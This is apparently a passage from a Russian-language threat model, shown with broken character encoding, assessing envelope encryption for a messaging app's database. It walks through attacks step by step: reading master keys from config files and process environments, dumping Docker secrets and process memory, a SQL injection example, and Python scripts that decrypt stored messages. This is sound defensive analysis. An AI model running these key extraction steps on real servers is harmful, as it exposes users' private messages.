‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ –®–∞–≥ 5: –†–∞–∑–≤–µ—Ä—Ç—ã–≤–∞–Ω–∏–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è                            ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
$ sudo python3 script/deploy.py
# –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä
# Docker secret –º–æ–Ω—Ç–∏—Ä—É–µ—Ç—Å—è –≤ /run/secrets/
```

### –ü—Ä–æ—Ü–µ—Å—Å —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è (runtime)

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ –ü–†–ò–õ–û–ñ–ï–ù–ò–ï (PHP/Go –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä)                               ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

1. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ: "–ü—Ä–∏–≤–µ—Ç, —ç—Ç–æ —Å–µ–∫—Ä–µ—Ç–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ"

2. –ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —á–∏—Ç–∞–µ—Ç:
   ‚îú‚îÄ $master_key = getenv("DATABASE_ENCRYPTION_MASTER_KEY")
   ‚îÇ  # "bWFzdGVya2V5bWFzdGVya2V5bWFzdGVya2V5bWFz"
   ‚îÇ
   ‚îú‚îÄ $encrypted_dek = file_get_contents(
   ‚îÇ      "/run/secrets/compass_database_encryption_secret_key"
   ‚îÇ  )
   ‚îÇ  # Base64-–∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π DEK
   ‚îÇ
   ‚îî‚îÄ –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ DEK:
      $dek = decrypt($encrypted_dek, base64_decode($master_key))
      # –¢–µ–ø–µ—Ä—å –µ—Å—Ç—å –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –∫–ª—é—á —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö

3. –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–ª—É—á–∞–π–Ω–æ–≥–æ IV:
   $iv = random_bytes(16)  # 128-–±–∏—Ç IV –¥–ª—è –∫–∞–∂–¥–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è

4. –®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è:
   $ciphertext = openssl_encrypt(
       "–ü—Ä–∏–≤–µ—Ç, —ç—Ç–æ —Å–µ–∫—Ä–µ—Ç–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ",
       "aes-256-cbc",
       $dek,
       OPENSSL_RAW_DATA,
       $iv
   )

5. –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –ë–î:
   $data = json_encode([
       "_" => base64_encode($iv . $ciphertext)
   ])
   # {"_": "wqaht653fe8h3f8h3f8h3f8h3f8h3f8h3f..."}

6. –ó–∞–ø–∏—Å—å –≤ –ë–î:
   INSERT INTO company_conversation.message_block_12
   (message_id, data, created_at)
   VALUES (123, '{"_": "wqaht653fe..."}', 1701234567)
```

### –ü—Ä–æ—Ü–µ—Å—Å —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏ (—á—Ç–µ–Ω–∏–µ)

```
1. –ß—Ç–µ–Ω–∏–µ –∏–∑ –ë–î:
   SELECT data FROM company_conversation.message_block_12
   WHERE message_id = 123
   # {"_": "wqaht653fe..."}

2. –ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ:
   ‚îú‚îÄ –ü–æ–ª—É—á–∞–µ—Ç DEK (—Ç–æ—Ç –∂–µ –ø—Ä–æ—Ü–µ—Å—Å, —á—Ç–æ –ø—Ä–∏ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–∏)
   ‚îú‚îÄ –î–µ–∫–æ–¥–∏—Ä—É–µ—Ç: $encrypted = base64_decode($data["_"])
   ‚îú‚îÄ –ò–∑–≤–ª–µ–∫–∞–µ—Ç: $iv = substr($encrypted, 0, 16)
   ‚îú‚îÄ –ò–∑–≤–ª–µ–∫–∞–µ—Ç: $ciphertext = substr($encrypted, 16)
   ‚îî‚îÄ –†–∞—Å—à–∏—Ñ—Ä–æ–≤—ã–≤–∞–µ—Ç:
      $plaintext = openssl_decrypt(
          $ciphertext,
          "aes-256-cbc",
          $dek,
          OPENSSL_RAW_DATA,
          $iv
      )

3. –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é: "–ü—Ä–∏–≤–µ—Ç, —ç—Ç–æ —Å–µ–∫—Ä–µ—Ç–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ"
```

---

## –ê–Ω–∞–ª–∏–∑ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏

### –ß—Ç–æ –∑–∞—â–∏—â–∞–µ—Ç —Å–∏—Å—Ç–µ–º–∞

#### ‚úÖ –ó–∞—â–∏—Ç–∞ –æ—Ç –∫—Ä–∞–∂–∏ –¥–∞–º–ø–∞ –ë–î (HIGH)

**–°—Ü–µ–Ω–∞—Ä–∏–π:** –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø–æ–ª—É—á–∏–ª –¥–æ—Å—Ç—É–ø –∫ MySQL –∏–ª–∏ —Ä–µ–∑–µ—Ä–≤–Ω–æ–π –∫–æ–ø–∏–∏ –ë–î.

```sql
-- –ü—Ä–∏–º–µ—Ä –¥–∞–Ω–Ω—ã—Ö –≤ –ë–î:
SELECT * FROM company_conversation.message_block_12;

+------------+---------------------------------------+------------+
| message_id | data                                  | created_at |
+------------+---------------------------------------+------------+
| 123        | {"_": "U2FsdGVkX1+wqaht653fe8h3f..."}  | 1701234567 |
| 124        | {"_": "U2FsdGVkX1+8h3f8h3f8h3f8h..."}  | 1701234568 |
+------------+---------------------------------------+------------+
```

**–†–µ–∑—É–ª—å—Ç–∞—Ç:** –ë–µ–∑ –∫–ª—é—á–µ–π –¥–∞–Ω–Ω—ã–µ –≤—ã–≥–ª—è–¥—è—Ç –∫–∞–∫ —Å–ª—É—á–∞–π–Ω—ã–π —à—É–º. AES-256 –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—á–µ—Å–∫–∏ —Å—Ç–æ–π–∫–∏–π.

**–í—Ä–µ–º—è –Ω–∞ –≤–∑–ª–æ–º –±—Ä—É—Ç—Ñ–æ—Ä—Å–æ–º:**
- 2^256 –≤–æ–∑–º–æ–∂–Ω—ã—Ö –∫–ª—é—á–µ–π
- –ü—Ä–∏ —Å–∫–æ—Ä–æ—Å—Ç–∏ 1 –º–ª—Ä–¥ –∫–ª—é—á–µ–π/—Å–µ–∫: ~3.67 √ó 10^63 –ª–µ—Ç
- **–í–ï–†–î–ò–ö–¢:** –ü—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ

#### ‚úÖ –ó–∞—â–∏—Ç–∞ –æ—Ç SQL-–∏–Ω—ä–µ–∫—Ü–∏–π (MEDIUM)

**–°—Ü–µ–Ω–∞—Ä–∏–π:** –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –ø–æ–∑–≤–æ–ª—è–µ—Ç –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–π SQL.

```sql
-- –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤—ã–ø–æ–ª–Ω—è–µ—Ç:
SELECT data FROM company_conversation.message_block_12
WHERE user_id = 1 UNION SELECT password FROM users;
```

**–†–µ–∑—É–ª—å—Ç–∞—Ç:** –î–∞–∂–µ –ø—Ä–∏ —É—Å–ø–µ—à–Ω–æ–π –∏–Ω—ä–µ–∫—Ü–∏–∏ –¥–∞–Ω–Ω—ã–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ã.

#### ‚úÖ –ó–∞—â–∏—Ç–∞ –æ—Ç –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏ —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö MySQL (MEDIUM)

**–°—Ü–µ–Ω–∞—Ä–∏–π:** –£–∫—Ä–∞–¥–µ–Ω—ã –ª–æ–≥–∏–Ω/–ø–∞—Ä–æ–ª—å MySQL –∏–∑ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏.

**–†–µ–∑—É–ª—å—Ç–∞—Ç:** –ü—Ä—è–º–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –ë–î –Ω–µ –¥–∞—Å—Ç –¥–æ—Å—Ç—É–ø –∫ —Å–æ–¥–µ—Ä–∂–∏–º–æ–º—É —Å–æ–æ–±—â–µ–Ω–∏–π.

---

### –ß—Ç–æ –ù–ï –∑–∞—â–∏—â–∞–µ—Ç —Å–∏—Å—Ç–µ–º–∞

#### ‚ùå –ê—Ç–∞–∫–∞ —Å root-–¥–æ—Å—Ç—É–ø–æ–º –∫ —Å–µ—Ä–≤–µ—Ä—É (CRITICAL)

**–ü—Ä–æ–±–ª–µ–º–∞:** –í—Å–µ –∫–ª—é—á–∏ —Ö—Ä–∞–Ω—è—Ç—Å—è –Ω–∞ —Ç–æ–º –∂–µ —Å–µ—Ä–≤–µ—Ä–µ.

```bash
# –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤—ã–ø–æ–ª–Ω—è–µ—Ç:
$ sudo su

# –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –º–∞—Å—Ç–µ—Ä-–∫–ª—é—á–∞
$ cat /opt/compass/configs/database.yaml | grep master_key
master_key: "bWFzdGVya2V5bWFzdGVya2V5bWFzdGVya2V5bWFz"

# –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ DEK
$ docker secret inspect compass_database_encryption_secret_key \
  --format='{{.Spec.Data}}' | base64 -d

# –ò–õ–ò –∏–∑ Swarm Raft log:
$ strings /var/lib/docker/swarm/raft/snap-*.db | grep -A5 compass_database
```

**–í—Ä–µ–º—è –Ω–∞ –≤–∑–ª–æ–º:** 15-30 –º–∏–Ω—É—Ç

#### ‚ùå –ê—Ç–∞–∫–∞ —á–µ—Ä–µ–∑ Docker exec (CRITICAL)

**–°—Ü–µ–Ω–∞—Ä–∏–π:** –î–æ—Å—Ç—É–ø –∫ –∑–∞–ø—É—â–µ–Ω–Ω–æ–º—É –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—É.

```bash
# –ü–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤
$ docker ps | grep php-monolith
abc123def456  compass/php_monolith  "php-fpm"  Up 2 hours

# –í–æ–π—Ç–∏ –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä
$ docker exec -it abc123def456 bash

# –ö–ª—é—á-—Å–µ–∫—Ä–µ—Ç —É–∂–µ –ø—Ä–∏–º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω
container# cat /run/secrets/compass_database_encryption_secret_key
U2FsdGVkX1+aGVsbG93b3JsZGhlbGxvd29ybGRoZWxs...

# –ú–∞—Å—Ç–µ—Ä-–∫–ª—é—á –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π –æ–∫—Ä—É–∂–µ–Ω–∏—è
container# echo $DATABASE_ENCRYPTION_MASTER_KEY
bWFzdGVya2V5bWFzdGVya2V5bWFzdGVya2V5bWFz

# –ò–õ–ò —á–µ—Ä–µ–∑ /proc:
container# cat /proc/1/environ | strings | grep DATABASE_ENCRYPTION_MASTER_KEY
DATABASE_ENCRYPTION_MASTER_KEY=bWFzdGVya2V5bWFzdGVya2V5bWFzdGVya2V5bWFz
```

**–í—Ä–µ–º—è –Ω–∞ –≤–∑–ª–æ–º:** 2-5 –º–∏–Ω—É—Ç

#### ‚ùå Memory dump –∞—Ç–∞–∫–∞ (HIGH)

**–°—Ü–µ–Ω–∞—Ä–∏–π:** –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ –ø–∞–º—è—Ç–∏ —Ä–∞–±–æ—Ç–∞—é—â–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.

```bash
# –ü–æ–ª—É—á–∏—Ç—å PID –ø—Ä–æ—Ü–µ—Å—Å–∞ PHP
$ docker exec abc123def456 ps aux | grep php-fpm
root  1  php-fpm: master process

# –î–∞–º–ø –ø–∞–º—è—Ç–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞
$ docker exec abc123def456 gcore 1
$ docker cp abc123def456:/core.1 ./core.1

# –ü–æ–∏—Å–∫ –∫–ª—é—á–µ–π –≤ –¥–∞–º–ø–µ
$ strings core.1 | grep -E '[A-Za-z0-9+/]{43}='
# –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π DEK –º–æ–∂–µ—Ç –Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –ø–∞–º—è—Ç–∏!
```

**–ó–∞—â–∏—Ç–∞:** –û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç (–Ω–µ—Ç encrypted memory)

#### ‚ùå –ê—Ç–∞–∫–∞ –Ω–∞ —Ñ–∏–∑–∏—á–µ—Å–∫–æ–º —É—Ä–æ–≤–Ω–µ (MEDIUM)

**–°—Ü–µ–Ω–∞—Ä–∏–π:** –ö—Ä–∞–∂–∞ —Ñ–∏–∑–∏—á–µ—Å–∫–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞ –∏–ª–∏ –¥–∏—Å–∫–∞.

```bash
# –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–Ω—Ç–∏—Ä—É–µ—Ç –¥–∏—Å–∫:
$ mount /dev/sda1 /mnt/stolen_disk

# –í—Å–µ –∫–ª—é—á–∏ –¥–æ—Å—Ç—É–ø–Ω—ã:
$ cat /mnt/stolen_disk/opt/compass/configs/database.yaml
$ cat /mnt/stolen_disk/var/lib/docker/swarm/raft/snap-*.db
```

**–ó–∞—â–∏—Ç–∞:** –ù–µ—Ç (—Ç—Ä–µ–±—É–µ—Ç—Å—è Full Disk Encryption –Ω–∞ —É—Ä–æ–≤–Ω–µ –û–°)

---

## –°—Ü–µ–Ω–∞—Ä–∏–∏ –∞—Ç–∞–∫

### –°—Ü–µ–Ω–∞—Ä–∏–π 1: –í–Ω–µ—à–Ω–∏–π –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ (–±–µ–∑ –¥–æ—Å—Ç—É–ø–∞ –∫ —Å–µ—Ä–≤–µ—Ä—É)

**–í–µ–∫—Ç–æ—Ä –∞—Ç–∞–∫–∏:**
1. SQL-–∏–Ω—ä–µ–∫—Ü–∏—è –≤ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏
2. –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ API
3. SSRF –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–º —Å–µ—Ä–≤–∏—Å–∞–º

**–í–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏:**
- ‚ùå –ò–∑–≤–ª–µ—á—å –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∏–∑ –ë–î
- ‚ùå –ü—Ä–æ—á–∏—Ç–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è (–Ω–µ—Ç –∫–ª—é—á–µ–π)

**–£—Ä–æ–≤–µ–Ω—å —É–≥—Ä–æ–∑—ã:** üü¢ –ù–ò–ó–ö–ò–ô (—Å–∏—Å—Ç–µ–º–∞ –∑–∞—â–∏—â–∞–µ—Ç)

**–°–ª–æ–∂–Ω–æ—Å—Ç—å –≤–∑–ª–æ–º–∞:** ‚õî –ù–ï–í–û–ó–ú–û–ñ–ù–û (–±–µ–∑ –∫–ª—é—á–µ–π)

---

### –°—Ü–µ–Ω–∞—Ä–∏–π 2: –°–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —É—á–µ—Ç–Ω–∞—è –∑–∞–ø–∏—Å—å MySQL

**–í–µ–∫—Ç–æ—Ä –∞—Ç–∞–∫–∏:**
1. –£—Ç–µ—á–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ —Å –ø–∞—Ä–æ–ª–µ–º MySQL
2. –ë—Ä—É—Ç—Ñ–æ—Ä—Å —Å–ª–∞–±–æ–≥–æ –ø–∞—Ä–æ–ª—è
3. –°–æ—Ü–∏–∞–ª—å–Ω–∞—è –∏–Ω–∂–µ–Ω–µ—Ä–∏—è

**–í–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏:**
```sql
-- –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –ë–î
mysql -h compass-mysql.example.com -u root -p'StolentPassword'

-- –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π
USE company_conversation;
SELECT * FROM message_block_12;
+------------+---------------------------------------+
| message_id | data                                  |
+------------+---------------------------------------+
| 123        | {"_": "U2FsdGVkX1+wqaht653fe8h3f..."}  |
+------------+---------------------------------------+

-- –ü–æ–ø—ã—Ç–∫–∞ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏: –ù–ï–í–û–ó–ú–û–ñ–ù–û (–Ω–µ—Ç –∫–ª—é—á–µ–π)
```

**–£—Ä–æ–≤–µ–Ω—å —É–≥—Ä–æ–∑—ã:** üü¢ –ù–ò–ó–ö–ò–ô (—Å–∏—Å—Ç–µ–º–∞ –∑–∞—â–∏—â–∞–µ—Ç)

**–°–ª–æ–∂–Ω–æ—Å—Ç—å –≤–∑–ª–æ–º–∞:** ‚õî –ù–ï–í–û–ó–ú–û–ñ–ù–û (–±–µ–∑ –¥–æ—Å—Ç—É–ø–∞ –∫ —Å–µ—Ä–≤–µ—Ä—É)

---

### –°—Ü–µ–Ω–∞—Ä–∏–π 3: –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä —Å SSH-–¥–æ—Å—Ç—É–ø–æ–º

**–í–µ–∫—Ç–æ—Ä –∞—Ç–∞–∫–∏:**
1. –°–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–π SSH-–∫–ª—é—á –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
2. –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ SSH/sudo
3. –ò–Ω—Å–∞–π–¥–µ—Ä—Å–∫–∞—è —É–≥—Ä–æ–∑–∞ (–∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫-–∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä)

**–®–∞–≥–∏ –∞—Ç–∞–∫–∏:**

```bash
# –®–ê–ì 1: –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ —Å–µ—Ä–≤–µ—Ä—É
$ ssh admin@compass-server.example.com

# –®–ê–ì 2: –ü–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π
$ sudo su

# –®–ê–ì 3: –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –º–∞—Å—Ç–µ—Ä-–∫–ª—é—á–∞
$ cat /opt/compass/configs/database.yaml
database_encryption:
  mode: "read_write"
  master_key: "bWFzdGVya2V5bWFzdGVya2V5bWFzdGVya2V5bWFz"

# –î–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ:
$ echo "bWFzdGVya2V5bWFzdGVya2V5bWFzdGVya2V5bWFz" | base64 -d > master_key.bin
$ hexdump -C master_key.bin
00000000  6d 61 73 74 65 72 6b 65  79 6d 61 73 74 65 72 6b  |masterkeymasaterk|
00000010  65 79 6d 61 73 74 65 72  6b 65 79 6d 61 73        |eymasaterkeymas|

# –®–ê–ì 4: –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ DEK
$ docker secret inspect compass_database_encryption_secret_key \
  --format='{{.Spec.Data}}' | base64 -d > encrypted_dek.bin

# –®–ê–ì 5: –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ DEK (–∏—Å–ø–æ–ª—å–∑—É—è –∞–ª–≥–æ—Ä–∏—Ç–º –∏–∑ create_secret.py)
$ python3 << 'EOF'
from Crypto.Cipher import AES
from hashlib import pbkdf2_hmac
import base64

# –ß—Ç–µ–Ω–∏–µ –º–∞—Å—Ç–µ—Ä-–∫–ª—é—á–∞
with open("master_key.bin", "rb") as f:
    master_key = f.read()

# –ß—Ç–µ–Ω–∏–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ DEK
with open("encrypted_dek.bin", "rb") as f:
    encrypted_dek = f.read()

# –î–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ base64
encrypted_dek = base64.b64decode(encrypted_dek)

# –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ —Å–æ–ª–∏ (–ø–æ—Å–ª–µ "Salted__")
assert encrypted_dek[:8] == b'Salted__'
salt = encrypted_dek[8:16]
ciphertext = encrypted_dek[16:]

# –î–µ—Ä–∏–≤–∞—Ü–∏—è –∫–ª—é—á–∞ (pbkdf2, –∫–∞–∫ –≤ create_secret.py)
pbk = pbkdf2_hmac('sha256', master_key, salt, 10000, 48)
key = pbk[:32]
iv = pbk[32:48]

# –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞
cipher = AES.new(key, AES.MODE_CBC, iv)
dek_padded = cipher.decrypt(ciphertext)

# –£–¥–∞–ª–µ–Ω–∏–µ PKCS#7 padding
padding_len = dek_padded[-1]
dek = dek_padded[:-padding_len]

print("Data Encryption Key (base64):", base64.b64encode(dek).decode())
with open("dek.bin", "wb") as f:
    f.write(dek)
EOF

# –í—ã–≤–æ–¥:
# Data Encryption Key (base64): aGVsbG93b3JsZGhlbGxvd29ybGRoZWxsb3dvcmxk

# –®–ê–ì 6: –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –¥–∞–º–ø–∞ –ë–î
$ docker exec -it $(docker ps | grep mysql-monolith | awk '{print $1}') \
  mysqldump -u root -p'RootPassword123' company_conversation > messages.sql

# –®–ê–ì 7: –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏–π
$ python3 << 'EOF'
import json
import base64
from Crypto.Cipher import AES

# –ß—Ç–µ–Ω–∏–µ DEK
with open("dek.bin", "rb") as f:
    dek = f.read()

# –ü—Ä–∏–º–µ—Ä –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è –∏–∑ –ë–î
encrypted_message = "wqaht653fe8h3f8h3f8h3f8h3f8h3f8h3f..."

# –î–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ
encrypted_data = base64.b64decode(encrypted_message)

# –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ IV (–ø–µ—Ä–≤—ã–µ 16 –±–∞–π—Ç)
iv = encrypted_data[:16]
ciphertext = encrypted_data[16:]

# –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞
cipher = AES.new(dek, AES.MODE_CBC, iv)
plaintext_padded = cipher.decrypt(ciphertext)

# –£–¥–∞–ª–µ–Ω–∏–µ padding
padding_len = plaintext_padded[-1]
plaintext = plaintext_padded[:-padding_len]

print("–†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ:", plaintext.decode('utf-8'))
EOF

# –í—ã–≤–æ–¥:
# –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ: –ü—Ä–∏–≤–µ—Ç, —ç—Ç–æ —Å–µ–∫—Ä–µ—Ç–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
```

**–£—Ä–æ–≤–µ–Ω—å —É–≥—Ä–æ–∑—ã:** üî¥ –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ô

**–°–ª–æ–∂–Ω–æ—Å—Ç—å –≤–∑–ª–æ–º–∞:** üü° –°–†–ï–î–ù–Ø–Ø

**–í—Ä–µ–º—è –Ω–∞ –≤–∑–ª–æ–º:** 15-30 –º–∏–Ω—É—Ç (–¥–ª—è –æ–ø—ã—Ç–Ω–æ–≥–æ —Å–ø–µ—Ü–∏–∞–ª–∏—Å—Ç–∞)

**–ù–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –Ω–∞–≤—ã–∫–∏:**
- –ó–Ω–∞–Ω–∏–µ Python/–∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏–∏
- –ü–æ–Ω–∏–º–∞–Ω–∏–µ Docker Secrets
- –ë–∞–∑–æ–≤—ã–µ –Ω–∞–≤—ã–∫–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∏—è Linux

---

### –°—Ü–µ–Ω–∞—Ä–∏–π 4: –î–æ—Å—Ç—É–ø –∫ —Ä–∞–±–æ—Ç–∞—é—â–µ–º—É –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—É

